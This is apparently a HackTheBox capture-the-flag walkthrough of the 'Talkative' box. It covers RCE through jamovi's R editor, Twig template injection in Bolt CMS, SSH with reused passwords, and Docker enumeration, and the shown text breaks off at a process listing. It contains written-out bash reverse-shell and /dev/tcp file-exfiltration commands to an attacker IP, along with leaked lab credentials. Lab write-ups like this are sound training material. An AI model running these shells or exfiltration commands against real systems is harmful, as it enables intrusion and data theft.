---
title: HTB: Talkative
url: https://0xdf.gitlab.io/2022/08/27/htb-talkative.html
date: 2022-08-27T13:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: hackthebox, ctf, htb-talkative, nmap, wfuzz, jamovi, bolt-cms, feroxbuster, rocket-chat, r-lang, docker, webhook, twig, ssti, mongo, deepce, shocker, docker-shocker, cap-dac-read-search, htb-paper, htb-anubis, htb-registry, oscp-like-v2
---

![Talkative](https://0xdfimages.gitlab.io/img/talkative-cover.png)

Talkative is about hacking a communications platform. I’ll start by abusing the built-in R scripter in jamovi to get execution and shell in a docker container. There I’ll find creds for the Bolt CMS instance, and use those to log into the admin panel and edit a template to get code execution in the next container. From that container, I can SSH into the main host. From the host, I’ll find a different network of containers, and find MongoDB running in one. I’ll connect to that and use it to get access as admin for a Rocket Chat instance. I’ll abuse the Rocket Chat webhook functionality to get a shell in yet another Docker container. This container has a dangerous capabilities, `CAP_DAC_READ_SEARCH`, which I’ll abuse to both read and write files on the host.

## Box Info

| Name | [Talkative](https://hackthebox.com/machines/talkative)  [Talkative](https://hackthebox.com/machines/talkative) [Play on HackTheBox](https://hackthebox.com/machines/talkative) |
| --- | --- |
| Release Date | [09 Apr 2022](https://twitter.com/hackthebox_eu/status/1511690257967853577) |
| Retire Date | 27 Aug 2022 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Talkative |
| Radar Graph | Radar chart for Talkative |
| First Blood User | 01:44:05[InfoSecJack InfoSecJack](https://app.hackthebox.com/users/52045) |
| First Blood Root | 03:16:56[jazzpizazz jazzpizazz](https://app.hackthebox.com/users/87804) |
| Creators | [TheCyberGeek TheCyberGeek](https://app.hackthebox.com/users/114053)  [JDgodd JDgodd](https://app.hackthebox.com/users/481778) |

## Recon

### nmap

`nmap` finds five open TCP ports, all HTTP servers:

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.155
Starting Nmap 7.80 ( https://nmap.org ) at 2022-08-22 16:46 UTC
Nmap scan report for talkative.htb (10.10.11.155)
Host is up (0.085s latency).
Not shown: 65529 closed ports
PORT     STATE    SERVICE
22/tcp   filtered ssh
80/tcp   open     http
3000/tcp open     ppp
8080/tcp open     http-proxy
8081/tcp open     blackice-icecap
8082/tcp open     blackice-alerts

Nmap done: 1 IP address (1 host up) scanned in 6.93 seconds
oxdf@hacky$ nmap -p 22,80,3000,8080-8082 -sCV 10.10.11.155
Starting Nmap 7.80 ( https://nmap.org ) at 2022-08-22 16:46 UTC
Nmap scan report for talkative.htb (10.10.11.155)
Host is up (0.085s latency).

PORT     STATE    SERVICE VERSION
22/tcp   filtered ssh
80/tcp   open     http    Apache httpd 2.4.52
|_http-generator: Bolt
|_http-server-header: Apache/2.4.52 (Debian)
|_http-title: Talkative.htb | Talkative
3000/tcp open     ppp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     X-XSS-Protection: 1
|     X-Instance-ID: 7BEhgKZrHjYcyBD4y
|     Content-Type: text/html; charset=utf-8
|     Vary: Accept-Encoding
|     Date: Mon, 22 Aug 2022 16:46:57 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <link rel="stylesheet" type="text/css" class="__meteor-css__"
...[snip]...
8080/tcp open     http    Tornado httpd 5.0
|_http-server-header: TornadoServer/5.0
|_http-title: jamovi
8081/tcp open     http    Tornado httpd 5.0
|_http-server-header: TornadoServer/5.0
|_http-title: 404: Not Found
8082/tcp open     http    Tornado httpd 5.0
|_http-server-header: TornadoServer/5.0
|_http-title: 404: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.80%I=7%D=8/22%Time=6303B300%P=x86_64-pc-linux-gnu%r(Ge
...[snip]...
Service Info: Host: 172.17.0.10

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.73 seconds

```

There’s one Apache (80), three Tornado (8080, 80801, and 8082), and something that looks HTTP-ish on 3000. Based on the [Apache version](https://packages.ubuntu.com/search?keywords=apache2), the host is likely running Ubuntu 22.04 jammy. [Tornado](https://www.tornadoweb.org/en/stable/) is a Python-based web framework designed to work within the Python asynchronous methods.

`nmap` shows that on 80, there’s a redirect to `http://talkative.htb`. I’ll run wfuzz to look for any subdomains, but it doesn’t find anything:

```

oxdf@hacky$ wfuzz -u http://talkative.htb -H "Host: FUZZ.talkative.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hw 28
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://talkative.htb/
Total requests: 4989

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

Total time: 44.06831
Processed Requests: 4989
Filtered Requests: 4989
Requests/sec.: 113.2105

```

### Website - TCP 80

#### Site

The site is for a company that makes a chat / call application:

[![image-20220822115423876](https://0xdfimages.gitlab.io/img/image-20220822115423876.png)](https://0xdfimages.gitlab.io/img/image-20220822115423876.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220822115423876.png)

There’s a few interesting bits on this page. The “Our People” section has three people with pictures and info. Each has a link to read more about them at `http://talkative.htb/person/janit-smith`, on each page gives their email addresses:
- Janit Smith (CFO) - `janit@talkative.htb`
- Matt Williams (Chief Marketing Officer / Head of Design) - `matt@talkative.htb`
- Saul Goodman (CEO) - `saul@talkative.htb`

The “Products” section shows three products. The references to other technologies are worth noting here. “Talk-A-Stats” mentions [Jamovi](https://www.jamovi.org/). The “Talkforbiz” product mentions [Rocket Chat](https://www.rocket.chat/).

At the bottom of the page, there’s a feedback form which includes another email address, `support@talkative.htb`. Submitting that form returns an error:

![image-20220822120246636](https://0xdfimages.gitlab.io/img/image-20220822120246636.png)

This is a good hint that [Bolt CMS](https://boltcms.io/) is in use on the site.

#### Tech Stack

The headers confirm information from above:

```

HTTP/1.1 200 OK
Date: Mon, 22 Aug 2022 15:54:16 GMT
Server: Apache/2.4.52 (Debian)
X-Powered-By: PHP/7.4.28
Cache-Control: max-age=0, must-revalidate, private
permissions-policy: interest-cohort=()
X-Powered-By: Bolt
Link: <http://talkative.htb/api/docs.jsonld>; rel="http://www.w3.org/ns/hydra/core#apiDocumentation"
Expires: Mon, 22 Aug 2022 15:54:17 GMT
Vary: Accept-Encoding
Content-Length: 36943
Connection: close
Content-Type: text/html; charset=UTF-8

```

The server is Apache, and there’s PHP running the Bolt CMS.

The API URL is interesting, but that endpoint doesn’t give anything of interest.

#### Directory Brute Force

I’ll start a `feroxbuster` against the site, and include `-x php` since I know the site is PHP, but it crawls and makes the site run slow for me. I’ll kill it after a bit, without much interesting:

```

oxdf@hacky$ feroxbuster -u http://talkative.htb -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://talkative.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      612l     2844w        0c http://talkative.htb/
301      GET        9l       28w      314c http://talkative.htb/files => http://talkative.htb/files/
200      GET      264l     1039w        0c http://talkative.htb/page
301      GET       12l       22w      342c http://talkative.htb/en => http://talkative.htb/en/
301      GET        9l       28w      315c http://talkative.htb/assets => http://talkative.htb/assets/
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_talkative_htb-1661184777.state ...
[>-------------------] - 3m      6714/300000  2h      found:5       errors:6632   
[>-------------------] - 3m      2920/60000   14/s    http://talkative.htb 
[>-------------------] - 3m      2600/60000   13/s    http://talkative.htb/ 
[>-------------------] - 3m      2700/60000   13/s    http://talkative.htb/files 
[>-------------------] - 3m      2600/60000   13/s    http://talkative.htb/en 
[>-------------------] - 3m      2500/60000   13/s    http://talkative.htb/assets 

```

### Rocket Chat - TCP 3000

On 3000, there’s an instance of [Rocket Chat](https://www.rocket.chat/):

![image-20220822125009556](https://0xdfimages.gitlab.io/img/image-20220822125009556.png)

I previously ran into Rocket Chat on [Paper](/2022/06/18/htb-paper.html#chatofficepaper---tcp-80). I don’t have any creds, but I can register an account. There’s only a `#general` channel, and it’s empty, other than showing that there’s a user named admin:

![image-20220822125143661](https://0xdfimages.gitlab.io/img/image-20220822125143661.png)

Not much else to do here.

### Jamovi - TCP 8080

This is an instance of jamovi:

![image-20220822131052258](https://0xdfimages.gitlab.io/img/image-20220822131052258.png)

jamovi is nice enough to tell me that this is an out of date version with security vulnerabilities.

Clicking on the three dots at the top right shows a menu with the version number:

![image-20220822130744955](https://0xdfimages.gitlab.io/img/image-20220822130744955.png)

### HTTP - TCP 8081/8082

Both these pages just return a “404 Not Found” message:

![](https://0xdfimages.gitlab.io/img/image-20220822131218567.png)

![image-20220822131232189](https://0xdfimages.gitlab.io/img/image-20220822131232189.png)

`feroxbuster` doesn’t find any paths. I’ll leave these for now.

## Shell as root in jamovi Container

### R Script Editor

I’ve written about abusing jamovi before on [Anubis](/2022/01/29/htb-anubis.html), though there it was a CVE that allowed for XSS via uploading a malicious file. Here, I’ll abuse the built in features of jamovi (that were disabled on Anubis).

In the “Analyses” tab there are a few tools for statistical analysis:

![image-20220822131519173](https://0xdfimages.gitlab.io/img/image-20220822131519173.png)

Clicking the “R” button pops a dropdown menu offering the “Rj Editor”:

![image-20220822131547795](https://0xdfimages.gitlab.io/img/image-20220822131547795.png)

According to [jamovi](https://blog.jamovi.org/2018/07/30/rj.html), this let’s you:

> analyse data in jamovi with R, and make use of your favourite R packages from within the jamovi statistical spreadsheet.

[R](https://www.r-project.org/) is a language for statistically computing. Clicking on it opens an editor:

![image-20220822131726002](https://0xdfimages.gitlab.io/img/image-20220822131726002.png)

At the bottom it says Ctrl + Shift + Enter to run.

### RCE POC

R has a built in `system` [command](https://stat.ethz.ch/R-manual/R-devel/library/base/html/system.html) to run OS commands. Just running `system("id")` doesn’t return anything, but with a bit of fiddling based on the docs, adding the `intern = TRUE` parameter returns output:

![image-20220822132004445](https://0xdfimages.gitlab.io/img/image-20220822132004445.png)

That looks like remote code execution as root.

### Shell

I’ll use a simple [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw) to get a shell from here:

![image-20220822132209604](https://0xdfimages.gitlab.io/img/image-20220822132209604.png)

I’ll also upgrade the shell using the standard [trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```

root@b06821bbda78:~# script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
root@b06821bbda78:~# ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
                                                                         
root@b06821bbda78:~# 

```

## Shell as www-data in Bolt Container

### Enumeration

#### Container

This shell is clearly in a container:

```

root@b06821bbda78:~# hostname
b06821bbda78                    
root@b06821bbda78:~# ip addr  
bash: ip: command not found
root@b06821bbda78:~# ifconfig
bash: ifconfig: command not found
root@b06821bbda78:~# cat /proc/net/fib_trie
Main:
...[snip]...
     +-- 172.18.0.0/16 2 0 2
        +-- 172.18.0.0/30 2 0 2
           |-- 172.18.0.0
              /32 link BROADCAST
              /16 link UNICAST
           |-- 172.18.0.2
...[snip]...

```

The IP is 172.18.0.2, and there’s very limited tools installed. The process list shows only jamovi stuff:

```

root@b06821bbda78:~# ps auxww
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0 101704   288 ?        Ss   15:21   0:00 /bin/bash /usr/bin/jamovi-server 41337 --if=*
root          12  1.1  1.2 863208 24240 ?        Sl   15:21   1:28 python3 -u -m jamovi.server 41337 --if=*
root          42  0.2  4.2 501692 85908 ?        Sl   17:10   0:02 /usr/lib/jamovi/bin/jamovi-engine --con=ipc:///tmp/tmp94xmzbhn/conn-0 --path=/tmp/tmp3ymj4a5l
root          44  0.1  2.9 255848 59840 ?        Sl   17:10   0:01 /usr/lib/jamovi/bin/jamovi-engine --con=ipc:///tmp/tmp94xmzbhn/conn-1 --path=/tmp/tmp3ymj4a5l
root          46  0.1  2.9 255848 59652 ?        Sl   17:10   0:01 /usr/lib/jamovi/bin/jamovi-engine --con=ipc:///tmp/tmp94xmzbhn/conn-2 --path=/tmp/tmp3ymj4a5l
root          60  0.0  0.2  90072  5948 ?        S    17:21   0:00 sh -c bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'
root          61  0.0  0.3 101704  7200 ?        S    17:21   0:00 bash -c bash -i >& /dev/tcp/10.10.14.6/443 0>&1
root          62  0.0  0.3 101880  7716 ?        S    17:21   0:00 bash -i
root          68  0.0  0.3 102660  6500 ?        R    17:22   0:00 script /dev/null -c bash
root          69  0.0  0.2  90072  5924 pts/0    Ss   17:22   0:00 sh -c bash
root          70  0.0  0.3 101884  7740 pts/0    S    17:22   0:00 bash
root          84  0.0  0.3 115908  7136 pts/0    R+   17:27   0:00 ps auxww

```

There’s also a `.dockerenv` file in the system root.

#### Home Dir

There are no home directories in `/home`, but there are some files in `/root`:

```

root@b06821bbda78:~# ls -la
total 28
drwx------ 1 root root 4096 Mar  7 23:19 .
drwxr-xr-x 1 root root 4096 Mar  7 23:18 ..
lrwxrwxrwx 1 root root    9 Mar  7 23:19 .bash_history -> /dev/null
-rw-r--r-- 1 root root 3106 Oct 22  2015 .bashrc
drwxr-xr-x 3 root root 4096 Aug 22 17:10 .jamovi
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
drwxrwxrwx 2 root root 4096 Aug 15  2021 Documents
-rw-r--r-- 1 root root 2192 Aug 15  2021 bolt-administration.omv

```

I’ll exfil the `bolt-administration.omv` file using Bash and `nc`. With `nc` listening from my host, from Talkative I’ll run:

```

root@b06821bbda78:~# cat bolt-administration.omv > /dev/tcp/10.10.14.6/443
root@b06821bbda78:~# md5sum bolt-administration.omv 
89a471297760280c51d7a48246f95628  bolt-administration.omv

```

At my host, the file is downloaded:

```

oxdf@hacky$ nc -lnvp 443 > bolt-administration.omv
Listening on 0.0.0.0 443
Connection received on 10.10.11.155 40266
oxdf@hacky$ md5sum bolt-administration.omv 
89a471297760280c51d7a48246f95628  bolt-administration.omv

```

The hashes match, so the file is good!

#### omv File

`.omv` files are documents from jamovi, but they are also just Zip archives:

```

oxdf@hacky$ file bolt-administration.omv 
bolt-administration.omv: Zip archive data, at least v2.0 to extract

```

There’s a standard file structure used by jamovi inside:

```

oxdf@hacky$ unzip -l bolt-administration.omv
Archive:  bolt-administration.omv
  Length      Date    Time    Name
---------  ---------- -----   ----
      106  2021-08-14 23:16   META-INF/MANIFEST.MF
      106  2021-08-14 23:16   meta
     2505  2021-08-14 23:16   index.html
     1055  2021-08-14 23:16   metadata.json
      433  2021-08-14 23:16   xdata.json
       48  2021-08-14 23:16   data.bin
       50  2021-08-14 23:16   01 empty/analysis
---------                     -------
     4303                     7 files

```

`xdata.json` has some interesting data. It’s JSON, so I’ll use `jq` to print it in a readable manner:

```

oxdf@hacky$ cat xdata.json | jq -c '.[]'
{"labels":[[0,"Username","Username",false],[1,"matt@talkative.htb","matt@talkative.htb",false],[2,"janit@talkative.htb","janit@talkative.htb",false],[3,"saul@talkative.htb","saul@talkative.htb",false]]}
{"labels":[[0,"Password","Password",false],[1,"jeO09ufhWD<s","jeO09ufhWD<s",false],[2,"bZ89h}V<S_DA","bZ89h}V<S_DA",false],[3,")SQWGm>9KHEA",")SQWGm>9KHEA",false]]}
{"labels":[]}

```

It appears to be passwords for the three users identified on the webpage.

#### Identify Cred Validity

To try these creds, I’ll need to figure out where I can use them. Given the name of the `.ovm` file, it seems likely Bolt CMS. But before diving too far in that direction, it’s good to make sure they don’t work anywhere else.

My first thought is to SSH to the host machine, which is likely 172.18.0.1. SSH was filtered from the outside, but maybe from the container it’ll work. Unfortunately, `ssh` isn’t installed on the container. I could upload [Chisel](https://github.com/jpillora/chisel) and tunnel from the `ssh` client on my VM, but I’ll look at the web interfaces first.

jamovi doesn’t seem to have an admin interface or any kind of login.

Rocket Chat [will have a link](https://docs.rocket.chat/guides/administration/admin-panel/info) to “Administration” in the user menu when logged in as an admin. I don’t:

![image-20220822142231292](https://0xdfimages.gitlab.io/img/image-20220822142231292.png)

I can try `/admin`, and it does show a simple page without much information:

![image-20220822164443604](https://0xdfimages.gitlab.io/img/image-20220822164443604.png)

None of the three passwords worked for the admin user, nor for the associated email address to log in.

The main site is Bolt CMS. When I ran into Bolt in [Registry](/2020/04/04/htb-registry.html#bolt), the login panel was at `/bolt`, and that works here as well:

![image-20220822142800059](https://0xdfimages.gitlab.io/img/image-20220822142800059.png)

Logging in with any email address leads to an error:

![image-20220822143142474](https://0xdfimages.gitlab.io/img/image-20220822143142474.png)

However, when I log in as admin with the creds “jeO09ufhWD<s”, it works:

[![image-20220822143418841](https://0xdfimages.gitlab.io/img/image-20220822143418841.png)](https://0xdfimages.gitlab.io/img/image-20220822143418841.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220822143418841.png)

I will note that the password I used was from row 1, which has matt as the username. But at the top, it says “Hey Saul”. The password reuse is a bit odd here.

### RCE From Bolt

#### Config Analysis

The Configuration page shows the `config/config.yaml` file:

![image-20220822143613639](https://0xdfimages.gitlab.io/img/image-20220822143613639.png)

At the bottom, it shows that I can’t modify the config as it’s not writable. The them in use is `base-2021`:

```

theme: base-2021

```

There’s also a section that limits the kind of files that can be uploaded to the server, and what attributes can be used in the generated HTML:

```

# Define the HTML tags and attributes that are allowed in cleaned HTML. This
# is used for sanitizing HTML, to make sure there are no undesirable elements
# left in the content that is shown to users. For example, tags like `<script>`
# or `onclick`-attributes.
# Note: enabling options in the `wysiwyg` settings will implicitly add items to
# the allowed tags. For example, if you set `images: true`, the `<img>` tag
# will be allowed, regardless of it being in the `allowed_tags` setting.
htmlcleaner:
    allowed_tags: [ div, span, p, br, hr, s, u, strong, em, i, b, li, ul, ol, mark, blockquote, pre, code, tt, h1, h2, h3, h4, h5, h6, dd, dl, dt, table, tbody, thead, tfoot, th, td, tr, a, img, address, abbr, iframe, caption, sub, sup, figure, figcaption, article, section, small , htb-paper, htb-anubis, htb-registry]
    allowed_attributes: [ id, class, style, name, value, href, src, alt, title, width, height, frameborder, allowfullscreen, scrolling, target, colspan, rowspan, rel, download, hreflang ]
    allowed_frame_targets: [ _blank, _self, _parent, _top ]

# Define the file types (extensions to be exact) that are acceptable for upload
# in either file fields or through the files screen.
accept_file_types: [ twig, html, js, css, scss, gif, jpg, jpeg, png, ico, zip, tgz, txt, md, doc, docx, pdf, epub, xls, xlsx, ppt, pptx, mp3, ogg, wav, m4a, mp4, m4v, ogv, wmv, avi, webm, svg, webp, avif]

# Alternatively, if you wish to limit these, uncomment the following list
# instead. It just includes file types / extensions that are harder to exploit.
# accept_file_types: [ gif, jpg, jpeg, png, txt, md, pdf, epub, mp3 ]

accept_media_types: [ gif, jpg, jpeg, png, svg, pdf, mp3, tiff, avif, webp ]

```

While Bolt is PHP, I can’t upload PHP files here without modifying this file.

#### Edit Template

Under Configuration, I’ll select “View & edit templates”, which leads to a page showing the different themes:

![image-20220822145021539](https://0xdfimages.gitlab.io/img/image-20220822145021539.png)

I’ll go into `base-2021` (as it is in use here), and select `index.twig`. It presents an editor for a relatively short `twig` file:

```

{% extends 'partials/_master.twig' %}

{% block main %}

  {% include 'partials/_index_hero.twig' with { content: 'blocks/hero-section' } %}

  {% include 'partials/_index_divider_top.twig' %}

  {% include 'partials/_index_vertical_block.twig' with { content: 'blocks/introduction', contenttype: 'pages' } %}

  {% include 'partials/_index_3_column_block_images.twig' with { contenttype: 'entries' } %}

  {% if 'people' in config.get('contenttypes').keys() %}
    {% include 'partials/_index_team.twig' with { content: 'blocks/people', contenttype: 'people' } %}
  {% endif %}

  {% if 'products' in config.get('contenttypes').keys() %}
    {% include 'partials/_index_pricing_block.twig' with { content: 'blocks/products', contenttype: 'products' } %}
  {% endif %}

  {% if 'pages' in config.get('contenttypes').keys() %}
    {% include 'partials/_index_3_column_block.twig' with { content: 'blocks/about', contenttype: 'pages' } %}
  {% endif %}

  {% include 'partials/_index_divider_bottom.twig' with { background: '#FFF' } %}

  {% include 'partials/_index_CTA.twig' with { content: 'blocks/call-to-action' } %}

  {% include 'partials/_index_divider_top.twig' with { background: '#f8fafc' } %}

  {% include 'partials/_index_contact_with_map.twig' %}

{% endblock main %}

```

This seems to be the main page. I’ll add a tag to the top and click “Save changes”:

![image-20220822145213876](https://0xdfimages.gitlab.io/img/image-20220822145213876.png)

It seems like it should show up on `talkative.htb`, but I don’t see it there on refreshing.

#### Cache

It took a bit of snooping around, but eventually I’ll come to the “Maintenance” > “Clear the cache” menu:

![image-20220822145357680](https://0xdfimages.gitlab.io/img/image-20220822145357680.png)

When I click “Clear the cache”, it reports success, and then on refreshing `talkative.htb`, my additional tag is at the top left:

![image-20220822145510497](https://0xdfimages.gitlab.io/img/image-20220822145510497.png)

#### Template Injection

[Twig](https://twig.symfony.com/)  is a template engine for PHP system. PayloadsAllTheThings has a section on it in the [SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#twig) page (even though this isn’t typical SSTI, it’s the same idea). There’s a section on Code execution, and I’ll grab the simplest looking one and toss it in the `index.twig`:

![image-20220822145839045](https://0xdfimages.gitlab.io/img/image-20220822145839045.png)

On saving and then clearing the cache, there’s code execution:

![image-20220822145930478](https://0xdfimages.gitlab.io/img/image-20220822145930478.png)

### Shell

To get a shell, I’ll update the injection to a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw):

![image-20220822150554268](https://0xdfimages.gitlab.io/img/image-20220822150554268.png)

On clearing the cache and then refreshing the main page, a reverse shell connects to a listening `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.155 33484
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ba67799048d7:/var/www/talkative.htb/bolt/public$ 

```

I’ll upgrade the shell using the [script trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```

www-data@ba67799048d7:/var/www/talkative.htb/bolt/public$ script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@ba67799048d7:/var/www/talkative.htb/bolt/public$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg 
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@ba67799048d7:/var/www/talkative.htb/bolt/public$ 

```

## Shell as saul on Talkative

### Enumeration

#### Container

This host is also a Docker container. There’s a `.dockerenv` file at the system root. The hostname is ba67799048d7, and the IP is 172.17.0.10:

```

www-data@ba67799048d7:/$ ls -la /.dockerenv 
-rwxr-xr-x 1 root root 0 Aug 22 15:21 /.dockerenv
www-data@ba67799048d7:/$ hostname
ba67799048d7
www-data@ba67799048d7:/$ cat /proc/net/fib_trie
...[snip]...
     +-- 172.17.0.0/16 2 0 2
        +-- 172.17.0.0/28 2 0 2
           |-- 172.17.0.0
              /32 link BROADCAST
              /16 link UNICAST
           |-- 172.17.0.10
              /32 host LOCAL
...[snip]...

```

#### Homedirs

There are no folders in `/home`, and I can’t access `/root`. www-data’s home directory is `/var/www`, which has the files for talkative.htb.

### SSH

This container does have `ssh` client installed, so I’ll give it a try on the host, presumably 172.17.0.1. Given the mismatch of password to user names I already noticed, I’ll try all combinations of the names and the password, and the same set that worked for Bolt work here:

```

www-data@ba67799048d7:/var/www$ ssh saul@172.17.0.1
The authenticity of host '172.17.0.1 (172.17.0.1)' can't be established.
ECDSA key fingerprint is SHA256:kUPIZ6IPcxq7Mei4nUzQI3JakxPUtkTlEejtabx4wnY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Could not create directory '/var/www/.ssh' (Permission denied).
Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
saul@172.17.0.1's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-81-generic x86_64)
...[snip]...
saul@talkative:~$

```

In saul’s home directory is finally `user.txt`:

```

saul@talkative:~$ cat user.txt
becf2e32************************

```

## Shell as root in Rocket Chat Container

### Enumeration

#### File System

There’s just not much else in saul’s home directory:

```

saul@talkative:~$ ls -la
total 36
drwxr-xr-x 5 saul saul 4096 Mar  6 00:18 .
drwxr-xr-x 3 root root 4096 Aug 10  2021 ..
lrwxrwxrwx 1 root root    9 Aug 28  2021 .bash_history -> /dev/null
-rw-r--r-- 1 saul saul  220 Aug 10  2021 .bash_logout
-rw-r--r-- 1 saul saul 3771 Aug 10  2021 .bashrc
drwx------ 3 saul saul 4096 Mar  6 00:18 .cache
drwxrwxr-x 3 saul saul 4096 Mar  6 00:18 .config
drwxrwxr-x 3 saul saul 4096 Mar  6 00:18 .local
-rw-r--r-- 1 saul saul  807 Aug 10  2021 .profile
-rw-r----- 1 root saul   33 Aug 22 15:21 user.txt

```

In fact, the rest of the box as far as I can access it is pretty barren.

#### Docker Analysis

All the services are running in docker containers, and there are a lot of them:

```

saul@talkative:~$ ps auxww | grep docker
root         916  0.0  1.1 1455780 23636 ?       Ssl  15:21   0:15 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
root        1275  0.0  0.0 1149100  660 ?        Sl   15:21   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 8082 -container-ip 172.18.0.2 -container-port 41339
root        1281  0.0  0.0 1150508  788 ?        Sl   15:21   0:00 /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 8082 -container-ip 172.18.0.2 -container-port 41339
root        1298  0.0  0.0 1222576  908 ?        Sl   15:21   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 8081 -container-ip 172.18.0.2 -container-port 41338
root        1303  0.0  0.0 1223984 1100 ?        Sl   15:21   0:00 /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 8081 -container-ip 172.18.0.2 -container-port 41338
root        1320  0.0  0.0 1222832 1364 ?        Sl   15:21   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 8080 -container-ip 172.18.0.2 -container-port 41337
root        1326  0.0  0.0 1076520 1120 ?        Sl   15:21   0:00 /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 8080 -container-ip 172.18.0.2 -container-port 41337
root        1452  0.0  0.0 1150252  640 ?        Sl   15:21   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 3000 -container-ip 172.17.0.3 -container-port 3000
root        1576  0.0  0.0 1222576 1248 ?        Sl   15:21   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6000 -container-ip 172.17.0.4 -container-port 80
root        1733  0.0  0.0 1148844 1288 ?        Sl   15:21   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6001 -container-ip 172.17.0.5 -container-port 80
root        1852  0.0  0.0 1148844 1184 ?        Sl   15:21   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6002 -container-ip 172.17.0.6 -container-port 80
root        1967  0.0  0.0 1149100  608 ?        Sl   15:21   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6003 -container-ip 172.17.0.7 -container-port 80
root        2077  0.0  0.0 1223984  468 ?        Sl   15:21   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6004 -container-ip 172.17.0.8 -container-port 80
root        2196  0.0  0.0 1223984  420 ?        Sl   15:21   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6005 -container-ip 172.17.0.9 -container-port 80
root        2303  0.0  0.0 1075112 1364 ?        Sl   15:21   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6006 -container-ip 172.17.0.10 -container-port 80
root        2417  0.0  0.0 1149100  812 ?        Sl   15:21   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6007 -container-ip 172.17.0.11 -container-port 80
root        2535  0.0  0.0 1222576  396 ?        Sl   15:21   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6008 -container-ip 172.17.0.12 -container-port 80
root        2661  0.0  0.0 1222576  692 ?        Sl   15:21   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6009 -container-ip 172.17.0.13 -container-port 80
root        2774  0.0  0.0 1075112  672 ?        Sl   15:21   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6010 -container-ip 172.17.0.14 -container-port 80
root        2889  0.0  0.0 1149100 1424 ?        Sl   15:21   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6011 -container-ip 172.17.0.15 -container-port 80
root        3004  0.0  0.0 1148844  600 ?        Sl   15:21   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6012 -container-ip 172.17.0.16 -container-port 80
